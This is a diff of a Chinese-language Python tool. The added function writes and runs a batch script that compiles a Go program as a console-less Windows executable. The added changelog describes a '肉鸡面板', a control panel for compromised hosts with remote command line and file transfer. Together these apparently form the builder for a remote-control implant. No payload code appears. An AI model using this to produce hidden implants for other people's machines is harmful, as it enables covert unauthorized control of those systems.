+echo    控制台: {"隐藏 (后台运行)" if not console else "显示 (调试模式)"}
+echo.
+echo [信息] 正在编译，请耐心等待...
+echo.
+
+set START_TIME=%time%
+
+go build -ldflags="-H=windowsgui" -o "{os.path.join(output_dir, exe_name + '.exe')}" "{temp_go}"
+
+set END_TIME=%time%
+
+echo.
+echo ╔══════════════════════════════════════════════════════════╗
+if exist "{os.path.join(output_dir, exe_name + '.exe')}" (
+    echo ║                      编译成功！                        ║
+    echo ╚══════════════════════════════════════════════════════════╝
+    echo.
+    echo [结果] EXE文件信息:
+    echo.
+    echo    位置: {os.path.join(output_dir, exe_name + '.exe')}
+    for %%F in ("{os.path.join(output_dir, exe_name + '.exe')}") do (
+        echo    大小: %%~zF 字节
+    )
+    echo    开始时间: %START_TIME%
+    echo    结束时间: %END_TIME%
+    echo.
+    echo [提示] 文件已生成，可以直接使用
+) else (
+    echo ║                      编译失败！                        ║
+    echo ╚══════════════════════════════════════════════════════════╝
+    echo.
+    echo [错误] 请检查上方错误信息
+    echo.
+    echo [建议] 常见问题:
+    echo    1. 是否已安装Go: 请访问 https://golang.org/dl/
+    echo    2. 是否以管理员权限运行
+    echo    3. 磁盘空间是否充足
+)
+echo.
+echo ╔══════════════════════════════════════════════════════════╗
+echo ║  按任意键关闭此窗口，或等待10秒后自动关闭...              ║
+echo ╚══════════════════════════════════════════════════════════╝
+echo.
+
+REM 等待10秒或按键
+timeout /t 10 /nobreak >nul 2>nul
+
+REM 清理临时文件
+del /f /q "{temp_go}" 2>nul
+exit
+'''
+
+        # 保存批处理文件
+        bat_path = os.path.join(output_dir, f"compile_{exe_name}.bat")
+        with open(bat_path, 'w', encoding='gbk') as f:
+            f.write(bat_content)
+
+        # 弹出新的CMD窗口
+        subprocess.Popen(
+            f'start cmd /c "{bat_path}"',
+            shell=True
+        )
+
+    except Exception as e:
+        print(f"错误: {str(e)}")
+        messagebox.showerror("失败", f"错误: {str(e)}")
+
 
 ### 九、其他的相关操作
 # 1、判断操作系统。True为windows
@@ -759,6 +1576,7 @@ def delete_dir(menu_path,tool_path):
             print(f"文件夹不存在: {folder_to_delete}")
 
 # 5、判断工具是绝对路径、相对路径还是链接
+#       1：绝对路径 2：相对路径 3：下载链接 4、链接打开
 def is_path(tool):
     def path_check(tool_path):
         if get_menu_path_one(tool["工具分类"]) in tool_path:
@@ -786,3 +1604,57 @@ def check_json_null(jsonInfo):
     if len(jsonInfo) == 0 or jsonInfo == {}:
         return False
     return True
+
+### 十、更新记录
+def get_update_record_content():
+    return {
+        "v1.2.0":
+"""
+1、完美解决【肉鸡面板】文件传输功能
+2、增加【肉鸡面板】GO语言支持
+""",
+        "v1.1.9":
+"""
+1、增加工具属性展示功能
+2、优化【肉鸡面板】文件传输功能
+3、目录【肉鸡面板】在文件传输时rouji_json_xinxi请求会导致A端与S端通讯出错
+""",
+        "v1.1.8":
+"""
+1、全面修复【肉鸡面板】的bug
+2、增加py导出和exe导出功能
+""",
+        "v1.1.7":
+"""
+1、完善【肉鸡面板】的文件上传功能
+2、优化【肉鸡面板】界面和部分bug
+""",
+        "v1.1.6":
+"""
+1、完善【肉鸡面板】的命令行基本功能
+2、优化【肉鸡面板】界面和部分bug
+""",
+        "v1.1.5":
+"""
+1、优化json格式化'单引号出错的问题
+""",
+        "v1.1.4":
+"""
+1、修改全局ctrl+A选择背景颜色
+2、修正【临时笔记】ctrl+z回退两次bug
+""",
+        "v1.1.3":
+"""
+1、修改【更新记录】的展示位置
+2、增加MD5编码功能
+""",
+        "v1.1.2":
+"""
+1、全面升级【临时笔记】面板
+""",
+        "v1.1.1":
+"""
+1、增加了【更新记录】面板
+2、优化了【编解码】面板的按钮位置
+"""
+    }
